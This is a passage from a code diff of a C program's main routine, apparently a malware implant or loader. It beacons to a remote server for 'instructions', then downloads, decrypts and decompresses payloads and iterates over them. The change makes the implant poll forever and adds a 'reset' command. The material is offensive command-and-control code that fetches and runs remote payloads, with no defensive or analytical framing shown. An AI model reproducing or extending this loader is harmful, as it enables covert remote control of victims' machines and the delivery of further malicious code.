@@ -41,73 +41,79 @@ int main()
     if (uid == NULL)
         return -1;
 
-    formattedURL = formatURL("instructions", uid);
-    if (formattedURL == NULL)
-        return -1;
+    // formattedURL = formatURL("instructions", uid);
+    // if (formattedURL == NULL)
+    //     return -1;
     
-    payload = beacon(formattedURL, 1);
-    if ( payload.memory == NULL)
-        return -1;
+    // payload = beacon(formattedURL, 1);
+    // if ( payload.memory == NULL)
+    //     return -1;
 
-    payloadOffset = (unsigned char *)payload.memory;
-    payloadMeta = parseMeta(&payloadOffset);
+    // payloadOffset = (unsigned char *)payload.memory;
+    // payloadMeta = parseMeta(&payloadOffset);
 
-    // password padding
-    psswd = psswdPadding(psswd);
-    if (psswd == NULL)
+    // // password padding
+    // psswd = psswdPadding(psswd);
+    // if (psswd == NULL)
+    // {
+    //     free(payload.memory);
+    //     free(payloadMeta);
+    //     free(formattedURL);
+    //     return -1;
+    // }
+    // decrypted = (void *)decrypt((unsigned char *)payloadOffset, payloadMeta[0].encryptedLength, payloadMeta[0].decryptedLength, psswd);
+    // decompressed = (void *)decompress((unsigned char *)decrypted, (uLong)payloadMeta[0].uncompressedLength, payloadMeta[0].decryptedLength);
+
+    // numLines = countLines(decompressed);
+    // currLine = parsePayloads(decompressed, numLines, ";")[0];
+
+    // free(decompressed);
+    // free(payload.memory);
+    // free(formattedURL);
+
+    while(1)
     {
-        free(payload.memory);
-        free(payloadMeta);
-        free(formattedURL);
-        return -1;
-    }
-    decrypted = (void *)decrypt((unsigned char *)payloadOffset, payloadMeta[0].encryptedLength, payloadMeta[0].decryptedLength, psswd);
-    decompressed = (void *)decompress((unsigned char *)decrypted, (uLong)payloadMeta[0].uncompressedLength, payloadMeta[0].decryptedLength);
+        // Sorry for repeated code, no time to refactor
+        formattedURL = formatURL("instructions", uid);
+        if (formattedURL == NULL)
+            return -1;
+        
+        payload = beacon(formattedURL, 2);
+        if ( payload.memory == NULL)
+            return -1;
 
-    numLines = countLines(decompressed);
-    currLine = parsePayloads(decompressed, numLines, ";")[0];
+        payloadOffset = (unsigned char *)payload.memory;
+        payloadMeta = parseMeta(&payloadOffset);
 
-    free(decompressed);
-    free(payload.memory);
-    free(formattedURL);
-
-    for ( currLineNum; currLineNum < numLines; currLineNum++) 
-    {
-        if (currLineNum != 0){
-            // Sorry for repeated code, no time to refactor
-            formattedURL = formatURL("instructions", uid);
-            if (formattedURL == NULL)
-                return -1;
-            
-            payload = beacon(formattedURL, 2);
-            if ( payload.memory == NULL)
-                return -1;
-
-            payloadOffset = (unsigned char *)payload.memory;
-            payloadMeta = parseMeta(&payloadOffset);
-
-            // password padding
-            psswd = psswdPadding(psswd);
-            if (psswd == NULL)
-            {
-                free(payload.memory);
-                free(payloadMeta);
-                free(formattedURL);
-                return -1;
-            }
-            decrypted = (void *)decrypt((unsigned char *)payloadOffset, payloadMeta[0].encryptedLength, payloadMeta[0].decryptedLength, psswd);
-            decompressed = (void *)decompress((unsigned char *)decrypted, (uLong)payloadMeta[0].uncompressedLength, payloadMeta[0].decryptedLength);
-            
-            numLines = countLines(decompressed);
-            currLine = parsePayloads(decompressed, numLines, ";")[currLineNum];
-
-            free(decompressed);
+        // password padding
+        psswd = psswdPadding(psswd);
+        if (psswd == NULL)
+        {
             free(payload.memory);
+            free(payloadMeta);
             free(formattedURL);
-            // End repeated code
+            return -1;
         }
+        decrypted = (void *)decrypt((unsigned char *)payloadOffset, payloadMeta[0].encryptedLength, payloadMeta[0].decryptedLength, psswd);
+        decompressed = (void *)decompress((unsigned char *)decrypted, (uLong)payloadMeta[0].uncompressedLength, payloadMeta[0].decryptedLength);
+        
+        numLines = countLines(decompressed);
+        currLine = parsePayloads(decompressed, numLines, ";")[currLineNum];
+
+        free(decompressed);
+        free(payload.memory);
+        free(formattedURL);
+        // End repeated code
+
         numPayloads = countPayloads(currLine);
         payloadNames = parsePayloads(currLine, numPayloads, " ");
+
+        if (!strcmp(payloadNames[0], "reset"))
+        {
+            currLineNum = 0;
+            continue;
+        }
+
         for (int j = 0; j < numPayloads; j++)
         {
             //loop for every payload to get in payloadNames
@@ -205,6 +211,7 @@ int main()
             free(payloadMeta);
             free(formattedURL);
         }
+        currLineNum++;
     }
     return 0;
 }
